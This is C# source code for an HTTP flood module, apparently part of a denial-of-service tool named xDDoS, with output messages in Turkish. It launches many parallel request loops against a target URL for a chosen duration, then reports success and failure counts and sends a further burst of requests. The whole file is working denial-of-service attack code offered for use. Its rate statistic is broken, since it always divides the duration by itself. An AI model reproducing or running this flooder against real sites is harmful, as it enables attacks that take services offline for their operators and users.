using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Diagnostics;
using System.Collections.Concurrent;
using Spectre.Console;
using System.Linq;

namespace xDDoS.Modules
{
    public class HttpFlood
    {
        public static async Task Run(string url, int durationSeconds, int parallelism)
        {
            var cts = new CancellationTokenSource();
            cts.CancelAfter(TimeSpan.FromSeconds(durationSeconds));
            int total = 0, success = 0, fail = 0;

            List<Task> tasks = new List<Task>();
            for (int i = 0; i < parallelism; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    using var client = new HttpClient();
                    while (!cts.IsCancellationRequested)
                    {
                        try
                        {
                            var resp = await client.GetAsync(url, cts.Token);
                            Interlocked.Increment(ref total);
                            if (resp.IsSuccessStatusCode)
                                Interlocked.Increment(ref success);
                            else
                                Interlocked.Increment(ref fail);
                        }
                        catch
                        {
                            Interlocked.Increment(ref fail);
                        }
                    }
                }));
            }

            await Task.WhenAll(tasks);

            Console.WriteLine($"[HTTP] Toplam: {total}, Başarılı: {success}, Hatalı: {fail}");

            AnsiConsole.Write(new Rule("[bold yellow]HTTP/HTTPS Flood Sonuçları[/]").RuleStyle("yellow"));
            var table = new Table();
            table.AddColumn("Başarılı");
            table.AddColumn("Hatalı");
            table.AddColumn("Geçen Süre (sn)");
            table.AddColumn("İstek/Saniye");
            table.AddRow(success.ToString(), fail.ToString(), (durationSeconds).ToString("0.00"), (durationSeconds/durationSeconds).ToString("0.00"));
            AnsiConsole.Write(table);
            AnsiConsole.MarkupLine("[grey]Detaylı loglar için aşağıya bakınız:[/]");
            var loglar = new ConcurrentBag<string>();
            Parallel.For(0, durationSeconds, new ParallelOptions { MaxDegreeOfParallelism = parallelism }, i =>
            {
                try
                {
                    var response = new HttpClient().GetAsync(url).Result;
                    if (response.IsSuccessStatusCode)
                    {
                        loglar.Add($"[green]{i+1}. İstek başarılı![/]");
                    }
                    else
                    {
                        loglar.Add($"[red]{i+1}. Hata: Sunucu {response.StatusCode} döndürdü.[/]");
                    }
                }
                catch (Exception ex)
                {
                    loglar.Add($"[red]{i+1}. Hata: {ex.Message}[/]");
                }
            });
            foreach(var log in loglar.Take(10))
                AnsiConsole.MarkupLine(log);
            if(loglar.Count > 10)
                AnsiConsole.MarkupLine($"[grey]... ve {loglar.Count-10} daha fazla log.[/]");
        }
    }
} 